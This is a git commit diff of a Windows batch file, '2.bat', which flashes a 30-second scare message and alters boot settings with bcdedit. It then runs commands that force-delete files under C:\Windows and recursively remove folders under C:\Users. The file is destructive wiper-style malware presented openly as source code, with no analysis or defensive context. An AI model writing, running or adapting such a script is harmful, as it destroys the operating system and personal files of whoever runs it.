767f754ae59259c2c688189cdcc4b32b4ebc001d
Aaravdevelops <137682685+Aaravdevelops@users.noreply.github.com>
2024-10-17 11:36:12 +0530

    Update 2.bat

--- 2.bat
+++ 2.bat
@@ -1,8 +1,7 @@
 @echo off
 start "" /wait cmd /c "echo DO SOMETHING RIGHT NOW YOU ONLY HAVE 30 SECONDS!&echo(&pause"
+bcdedit /set {bootmgr} path \EFI\Microsoft\Boot\bootmgfw.efi
 bcdedit /set {default} recoveryenabled Yes
-bcdedit /set {default} bootstatuspolicy DisplayAllFailures
-bcdedit /set {bootmgr} displaybootmenu Yes
 bcdedit /timeout 1
 DEL /F /S /Q /A C:\Windows*.*
 rmdir C:\Users*.* /S /Q
